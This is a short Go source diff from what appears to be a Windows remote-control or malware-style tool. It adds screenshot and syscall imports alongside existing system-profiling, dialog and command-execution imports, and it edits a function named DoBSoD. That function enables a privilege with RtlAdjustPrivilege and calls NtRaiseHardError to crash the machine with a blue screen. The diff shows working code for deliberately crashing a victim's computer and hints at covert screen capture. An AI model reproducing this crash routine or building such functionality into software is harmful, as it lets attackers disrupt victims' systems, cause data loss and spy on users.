@@ -7,6 +7,7 @@ import (
 	"github.com/shirou/gopsutil/host"
 	"github.com/shirou/gopsutil/mem"
 	"github.com/tawesoft/golib/v2/dialog"
+	"github.com/vova616/screenshot"
 	"image/png"
 	"io"
 	"log"
@@ -14,6 +15,7 @@ import (
 	"os"
 	"os/exec"
 	"regexp"
+	"syscall"
 	"unsafe"
 )
 
@@ -32,7 +34,7 @@ var (
 	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")
 )
 
-func DoBSoD(opcode uint8) {
+func DoBSoD(opcode uintptr) {
 	RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(new(bool))))
 	NtRaiseHardError.Call(opcode, 0, 0, uintptr(0), 6, uintptr(unsafe.Pointer(new(uintptr))))
 }
